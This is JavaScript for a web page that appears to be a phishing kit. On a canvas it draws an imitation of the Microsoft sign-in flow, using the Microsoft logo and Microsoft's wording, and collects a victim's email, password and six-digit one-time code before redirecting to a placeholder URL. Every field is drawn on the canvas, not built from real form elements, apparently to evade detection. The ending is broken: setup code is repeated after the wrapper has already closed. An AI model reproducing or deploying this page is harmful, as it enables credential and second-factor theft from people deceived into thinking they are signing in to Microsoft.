  // ===== Canvas / state =====
  const canvas = document.getElementById("c");
  const ctx = canvas.getContext("2d");
  const shim = document.getElementById("shim");

  const state = {
    step: "email",   // email -> password -> sendcode -> otp
    focus: "field",
    email: "",
    password: "",
    otp: ["","","","","",""],
    otpIndex: 0,
    caretOn: true, lastBlink: 0,
    buttons:{}, fields:{}, press:{x:0,y:0},
    loading:false, spinAngle:0
  };

  const bgImg = new Image(); bgImg.src = BG_URL;
  const logo  = new Image(); logo.src  = "data:image/svg+xml;utf8," + encodeURIComponent(MICROSOFT_SVG);

  // ===== Layout =====
  const CARD_W = 448, CARD_H = 360;
  const PAD = 50;
  const GAP_SM = 30, GAP_MD = 30, GAP_LG = 30;

  // ===== Helpers =====
  function rr(x,y,w,h,r){ ctx.beginPath(); ctx.moveTo(x+r,y);
    ctx.arcTo(x+w,y,x+w,y+h,r); ctx.arcTo(x+w,y+h,x,y+h,r);
    ctx.arcTo(x,y+h,x,y,r); ctx.arcTo(x,y,x+w,y,r); ctx.closePath();
  }
  function hit(r,x,y){ return r && x>=r.x && y>=r.y && x<=r.x+r.w && y<=r.y+r.h; }
  function resize(){
    const dpr=Math.max(1,window.devicePixelRatio||1);
    const w=canvas.clientWidth,h=canvas.clientHeight;
    canvas.width=w*dpr; canvas.height=h*dpr; ctx.setTransform(dpr,0,0,dpr,0,0);
    draw();
  }
  new ResizeObserver(resize).observe(canvas.parentElement);

  function title(text, x, y, center){
    ctx.fillStyle="#242424";
    ctx.font="600 24px Segoe UI, system-ui, -apple-system, Roboto, Arial";
    ctx.textAlign=center?"center":"left"; ctx.textBaseline="alphabetic";
    ctx.fillText(text,x,y);
  }
  function body(text, x, y, center){
    ctx.fillStyle="#606060";
    ctx.font="14px Segoe UI, system-ui, -apple-system, Roboto, Arial";
    ctx.textAlign=center?"center":"left"; ctx.textBaseline="alphabetic";
    if(center){
      const maxW=360, words=text.split(" "); let line="", yy=y;
      for(let i=0;i<words.length;i++){
        const test=line?line+" "+words[i]:words[i];
        if(ctx.measureText(test).width>maxW && i>0){ ctx.fillText(line,x,yy); line=words[i]; yy+=20; }
        else line=test;
      }
      ctx.fillText(line,x,yy);
    } else {
      ctx.fillText(text,x,y);
    }
  }

  function emailField(name, x,y,w, value, placeholder){
    state.fields[name] = {x, y: y-22, w, h:30, type:"text"};
    ctx.font="14px Segoe UI, system-ui, -apple-system";
    ctx.textAlign="left"; ctx.textBaseline="alphabetic";
    ctx.fillStyle = value ? "#242424" : "#767676";
    ctx.fillText(value || placeholder, x, y);
    ctx.strokeStyle = (state.focus===name) ? "#0078d4" : "#a6a6a6"; ctx.lineWidth=2;
    ctx.beginPath(); ctx.moveTo(x, y+8); ctx.lineTo(x+w, y+8); ctx.stroke();
    if(state.focus===name && state.caretOn){
      const tw=ctx.measureText(value).width;
      ctx.fillStyle="#0078d4"; ctx.fillRect(x+tw+1, y-12, 1.5, 24);
    }
  }
  function boxedField(name, x, y, w, h, value, placeholder, mask){
    placeholder = (typeof placeholder !== "undefined") ? placeholder : "";
    mask        = (typeof mask !== "undefined") ? mask : false;

    state.fields[name] = {x,y,w,h,type: mask ? "password":"text"};
    ctx.fillStyle="#fff"; rr(x,y,w,h,6); ctx.fill();
    ctx.strokeStyle=(state.focus===name)?"#0078d4":"#a6a6a6"; ctx.lineWidth=1; ctx.stroke();
    ctx.save(); ctx.beginPath(); rr(x,y,w,h,6); ctx.clip();
    ctx.font="14px Segoe UI, system-ui, -apple-system"; ctx.textBaseline="middle";
    const pad=12, cy=y+h/2+0.5;
    const shown = value ? (mask ? "•".repeat(value.length) : value) : placeholder;
    ctx.fillStyle=value?"#242424":"#767676"; ctx.textAlign="left";
    ctx.fillText(shown, x+pad, cy);
    if(state.focus===name && state.caretOn){
      const t = mask ? "•".repeat(value.length) : value;
      const tw = ctx.measureText(t).width;
      ctx.fillStyle="#0078d4"; ctx.fillRect(x+pad+tw+1, y+8, 1.5, h-16);
    }
    ctx.restore();
  }
  function otpBoxes(cx,y,size,gap){
    const total=6*size+5*gap, start=cx-total/2;
    for(let i=0;i<6;i++){
      const bx=start+i*(size+gap), by=y;
      rr(bx,by,size,size,8); ctx.fillStyle="#fff"; ctx.fill();
      const active=state.focus==="otp" && state.otpIndex===i;
      ctx.strokeStyle=active?"#0078d4":"#a6a6a6"; ctx.lineWidth=1; ctx.stroke();
      ctx.font="700 22px ui-monospace, Menlo, Consolas, monospace";
      ctx.fillStyle="#242424"; ctx.textAlign="center"; ctx.textBaseline="middle";
      ctx.fillText(state.otp[i]||"", bx+size/2, by+size/2+1);
      if(active && !state.otp[i] && state.caretOn){
        ctx.fillStyle="#0078d4"; ctx.fillRect(bx+size/2, by+8, 1.5, size-16);
      }
    }
    state.fields["otpgrid"] = {x:start, y, w:total, h:size};
  }
  function button(name,x,y,w,h,text,primary,disabled){
    state.buttons[name]={x,y,w,h,disabled:Boolean(disabled)};
    ctx.save(); ctx.globalAlpha=disabled?0.6:1;
    rr(x,y,w,h,8); ctx.fillStyle=primary!==false?"#0078d4":"#e5e7eb"; ctx.fill();
    ctx.fillStyle=primary!==false?"#fff":"#111827";
    ctx.font="600 16px Segoe UI, system-ui, -apple-system";
    ctx.textAlign="center"; ctx.textBaseline="middle";
    ctx.fillText(text, x+w/2, y+h/2+0.5);
    ctx.restore();
  }

  // Spinner overlay
  function drawSpinnerOverlay(cardX, cardY){
    const cx = cardX + CARD_W/2, cy = cardY + CARD_H/2;
    ctx.save();
    ctx.fillStyle="rgba(255,255,255,.75)";
    rr(cardX, cardY, CARD_W, CARD_H, 16); ctx.fill();
    ctx.translate(cx, cy);
    ctx.rotate(state.spinAngle);
    ctx.strokeStyle="#0078d4"; ctx.lineWidth=4; ctx.lineCap="round";
    ctx.beginPath(); ctx.arc(0,0,20, 0, Math.PI*1.3); ctx.stroke();
    ctx.restore();
  }

  // ===== Draw =====
  function draw(){
    const w=canvas.clientWidth, h=canvas.clientHeight;
    ctx.clearRect(0,0,w,h);
    if(bgImg.complete) ctx.drawImage(bgImg,0,0,w,h);

    const cardX=Math.floor(w/2 - CARD_W/2);
    const cardY=Math.floor(h/2 - CARD_H/2);

    ctx.save(); ctx.shadowColor="rgba(0,0,0,.18)"; ctx.shadowBlur=24; ctx.shadowOffsetY=10;
    rr(cardX, cardY, CARD_W, CARD_H, 16); ctx.fillStyle="#fff"; ctx.fill(); ctx.restore();

    const innerLeft   = cardX + PAD;
    const innerRight  = cardX + CARD_W - PAD;
    const innerTop    = cardY + PAD;
    const innerBottom = cardY + CARD_H - PAD;
    const cx = (innerLeft + innerRight) / 2;

    state.buttons = {}; state.fields = {};

    const LOGO_W=144, LOGO_H=24;
    if(logo.complete){
      if(state.step==="email") ctx.drawImage(logo, innerLeft, innerTop, LOGO_W, LOGO_H);
      else ctx.drawImage(logo, cx-LOGO_W/2, innerTop, LOGO_W, LOGO_H);
    }

    let y = innerTop + LOGO_H + GAP_LG;

    if(state.step==="email"){
      title("Sign in", innerLeft, y, false); y += GAP_MD + 10;

      const fw = innerRight - innerLeft;
      emailField("field", innerLeft, y, fw, state.email, "Email, phone, or Skype");
      y += GAP_LG * 2;

      ctx.font="14px Segoe UI, system-ui, -apple-system"; ctx.fillStyle="#0078d4"; ctx.textAlign="left";
      ctx.fillText("No account? Create one!", innerLeft, y); y += GAP_MD;
      ctx.fillText("Can't access your account?", innerLeft, y);

      const btnW=110, btnH=40, btnX=innerRight - btnW, btnY=innerBottom - btnH;
      button("next", btnX, btnY, btnW, btnH, "Next", true, !state.email.trim());

    } else if(state.step==="password"){
      title("Sign in", cx, y, true); y += GAP_MD + 10;

      const fw = (innerRight - innerLeft);
      boxedField("field", innerLeft, y, fw, 44, state.password, "Enter your password", true);

      const btnY = innerBottom - 44;
      button("back", innerLeft,                btnY, (fw-12)/2, 44, "Back", false);
      button("next", innerLeft + (fw+12)/2,    btnY, (fw-12)/2, 44, "Next", true, !state.password);

    } else if(state.step==="sendcode"){
      const pillW = Math.min(280, innerRight - innerLeft);
      const pillH = 32;
      rr(cx - pillW/2, y - 6, pillW, pillH, pillH/2);
      ctx.fillStyle="#f3f4f6"; ctx.fill();
      ctx.fillStyle="#242424"; ctx.font="14px Segoe UI, system-ui"; ctx.textAlign="center"; ctx.textBaseline="middle";
      ctx.fillText(state.email || "you@example.com", cx, y - 6 + pillH/2+0.5);

      y += pillH + 16;
      title("Get a code to sign in", cx, y, true);
      y += GAP_MD;
      body(`We'll send a code to ${state.email || "you@example.com"} to sign you in.`, cx, y, true);

      const fw = (innerRight - innerLeft);
      const btnY = innerBottom - 44;
      button("back", innerLeft,             btnY, (fw-12)/2, 44, "Back", false);
      button("send", innerLeft+(fw+12)/2,   btnY, (fw-12)/2, 44, "Send code", true);

    } else if(state.step==="otp"){
      state.buttons["backchev"] = {x:innerLeft-8,y:innerTop-8,w:32,h:32};
      ctx.lineWidth=2; ctx.strokeStyle="#606060"; ctx.beginPath();
      ctx.moveTo(innerLeft+8, innerTop+8); ctx.lineTo(innerLeft-4, innerTop+18); ctx.lineTo(innerLeft+8, innerTop+28); ctx.stroke();

      const pillW = Math.min(280, innerRight - innerLeft);
      const pillH = 32;
      rr(cx - pillW/2, y - 6, pillW, pillH, pillH/2);
      ctx.fillStyle="#f3f4f6"; ctx.fill();
      ctx.fillStyle="#242424"; ctx.font="14px Segoe UI, system-ui"; ctx.textAlign="center"; ctx.textBaseline="middle";
      ctx.fillText(state.email || "you@example.com", cx, y - 6 + pillH/2+0.5);

      y += pillH + 16;
      title("Enter your code", cx, y, true);
      y += GAP_SM;
      body(`Enter the code we sent to ${state.email || "you@example.com"}.`, cx, y, true);
      y += GAP_LG;

      otpBoxes(cx, y, 44, 12);

      const allFilled = state.otp.every(d=>d.length===1);
      const fw = (innerRight - innerLeft);
      const btnY = innerBottom - 44;
      button("verify", innerLeft, btnY, fw, 44, "Verify", true, !allFilled);
    }

    if(state.loading) drawSpinnerOverlay(cardX, cardY);
  }

  // ===== Transition helper with spinner =====
  function withLoading(next){
    state.loading = true; draw();
    setTimeout(() => { state.loading = false; next(); draw(); }, TRANSITION_DELAY_MS);
  }

  // ===== Interaction =====
  function focusShim(){
    // set mobile keyboard according to current step
    if (state.step === "otp") {
      shim.setAttribute("inputmode", "numeric");
      shim.removeAttribute("maxlength");   // we manage length ourselves
    } else {
      shim.setAttribute("inputmode", "text");
      shim.removeAttribute("maxlength");
    }
    shim.value="";
    shim.focus({preventScroll:true});
  }

  function go(name){
    if(state.loading) return;

    if(state.step==="email" && name==="next"){
      withLoading(() => { state.step="password"; state.focus="field"; focusShim(); });
    }
    else if(state.step==="password" && name==="next"){
      withLoading(() => { state.step="sendcode"; state.focus="none"; });
    }
    else if(state.step==="password" && name==="back"){
      withLoading(() => { state.step="email"; state.focus="field"; focusShim(); });
    }
    else if(state.step==="sendcode" && name==="send"){
      withLoading(() => { state.step="otp"; state.focus="otp"; state.otp=["","","","","",""]; state.otpIndex=0; focusShim(); });
    }
    else if(state.step==="otp" && (name==="back"||name==="backchev")){
      withLoading(() => { state.step="sendcode"; state.focus="none"; });
    }
    else if(state.step==="otp" && name==="verify"){
      state.loading = true; draw();
      setTimeout(() => { window.location.href = REDIRECT_URL; }, TRANSITION_DELAY_MS);
      return;
    }
  }

  canvas.addEventListener("pointerdown",(e)=>{
    if(state.loading) return;
    const r=canvas.getBoundingClientRect(); const x=e.clientX-r.left, y=e.clientY-r.top;
    state.press={x,y};
    if((state.step==="email"||state.step==="password") && hit(state.fields["field"],x,y)){ state.focus="field"; focusShim(); }
    else if(state.step==="otp" && hit(state.fields["otpgrid"],x,y)){
      state.focus="otp"; const gx=state.fields["otpgrid"].x, size=44, gap=12;
      const i=Math.floor((x-gx)/(size+gap)); state.otpIndex=Math.max(0,Math.min(5,i)); focusShim();
    }
    if(state.step==="otp" && hit(state.buttons["backchev"],x,y)) go("backchev");
  });
  canvas.addEventListener("pointerup",(e)=>{
    if(state.loading) return;
    const r=canvas.getBoundingClientRect(); const x=e.clientX-r.left, y=e.clientY-r.top;
    for(const [n,b] of Object.entries(state.buttons)){
      if(!b || b.disabled) continue;
      if(hit(b,x,y) && hit(b,state.press.x,state.press.y)){ go(n); break; }
    }
  });

  // ------- Global keyboard (guarded so it doesn't run when shim has focus) -------
  window.addEventListener("keydown",(e)=>{
    if(state.loading) return;

    // EMAIL
    if(state.step==="email" && state.focus==="field"){
      if (document.activeElement === shim) return;  // prevent double handling
      if(e.key==="Enter"){ if(state.email.trim()) go("next"); return; }
      if(e.key==="Backspace"){ state.email=state.email.slice(0,-1); draw(); return; }
      if(e.key.length===1){ state.email+=e.key; draw(); return; }
    }

    // PASSWORD
    if(state.step==="password" && state.focus==="field"){
      if (document.activeElement === shim) return;  // prevent double handling
      if(e.key==="Enter"){ if(state.password) go("next"); return; }
      if(e.key==="Backspace"){ state.password=state.password.slice(0,-1); draw(); return; }
      if(e.key.length===1){ state.password+=e.key; draw(); return; }
    }

    // OTP
    if(state.step==="otp" && state.focus==="otp"){
      if (document.activeElement === shim) return;  // prevent double handling
      if(/[0-9]/.test(e.key)){ state.otp[state.otpIndex]=e.key; if(state.otpIndex<5) state.otpIndex++; draw(); return; }
      if(e.key==="Backspace"){
        if(state.otp[state.otpIndex]) state.otp[state.otpIndex]="";
        else if(state.otpIndex>0){ state.otpIndex--; state.otp[state.otpIndex]=""; }
        draw(); return;
      }
      if(e.key==="ArrowLeft"){ state.otpIndex=Math.max(0,state.otpIndex-1); draw(); return; }
      if(e.key==="ArrowRight"){ state.otpIndex=Math.min(5,state.otpIndex+1); draw(); return; }
      if(e.key==="Enter"){ if(state.otp.every(d=>d)) go("verify"); }
    }
  });

  // ------- Shim input (mobile / IME) -------
  shim.addEventListener("input",()=>{
    if(state.loading) return;
    const v=shim.value; if(!v) return;
    for(const ch of v){
      if(state.step==="email" && state.focus==="field"){
        if(ch==="\n"){ if(state.email.trim()) go("next"); } else if(ch!=="\r"){ state.email+=ch; }
      } else if(state.step==="password" && state.focus==="field"){
        if(ch==="\n"){ if(state.password) go("next"); } else if(ch!=="\r"){ state.password+=ch; }
      } else if(state.step==="otp" && state.focus==="otp"){
        if(/[0-9]/.test(ch)){ state.otp[state.otpIndex]=ch; if(state.otpIndex<5) state.otpIndex++; }
      }
    }
    shim.value=""; draw();
  });

  shim.addEventListener("keydown",(e)=>{
    if(state.loading) return;
    if(e.key==="Backspace"){
      if(state.step==="email" && state.focus==="field"){ state.email=state.email.slice(0,-1); }
      else if(state.step==="password" && state.focus==="field"){ state.password=state.password.slice(0,-1); }
      else if(state.step==="otp" && state.focus==="otp"){
        if(state.otp[state.otpIndex]) state.otp[state.otpIndex]="";
        else if(state.otpIndex>0){ state.otpIndex--; state.otp[state.otpIndex]=""; }
      }
      e.preventDefault(); draw();
    }
  });

  // Blink + spinner animation
  function loop(ts){
    state.spinAngle += 0.14;
    if(ts - state.lastBlink > 530){ state.caretOn=!state.caretOn; state.lastBlink=ts; }
    draw();
    requestAnimationFrame(loop);
  }
  requestAnimationFrame(loop);

  canvas.width=canvas.clientWidth; canvas.height=canvas.clientHeight; resize();
  state.focus="field";
})();

  // Ensure the IIFE finishes correctly:
  canvas.width = canvas.clientWidth;
  canvas.height = canvas.clientHeight;
  resize();
  state.focus = "field";
})();
</script>
</body>
